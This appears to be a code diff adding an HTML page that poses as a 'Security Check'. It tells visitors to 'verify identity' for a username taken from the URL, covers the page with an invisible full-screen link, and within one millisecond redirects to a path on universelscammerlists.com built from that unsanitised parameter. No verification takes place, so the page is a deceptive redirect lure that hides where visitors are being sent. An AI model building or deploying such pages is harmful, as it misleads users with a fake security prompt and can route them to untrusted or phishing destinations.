@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Security Check</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+  body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background-color: #ffffff; }
+  
+  .link-overlay {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: 9999;
+    cursor: pointer;
+    background: rgba(0,0,0,0); 
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    text-decoration: none;
+  }
+
+  .center-text {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    font-size: 18px; 
+    color: #5f6368;
+    opacity: 0.7;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+
+<a id="dynamic-link" href="#" class="link-overlay">
+   <span class="center-text">
+     Verify identity for <b id="username-display">user</b>...<br>
+     <span style="font-size: 14px; opacity: 0.5;">(Tap anywhere to continue)</span>
+   </span>
+</a>
+
+<script>
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const user = urlParams.get('user');
+
+    let finalUrl = "https://universelscammerlists.com/";
+
+    if (user) {
+        finalUrl = "https://universelscammerlists.com/user/" + user + ".php";
+        document.getElementById('username-display').textContent = user;
+    } else {
+        document.getElementById('username-display').textContent = "Unknown";
+    }
+
+    document.getElementById('dynamic-link').href = finalUrl;
+
+    setTimeout(function() {
+       window.location.replace(finalUrl);
+    }, 1);
+
+</script>
+
+</body>
+</html>
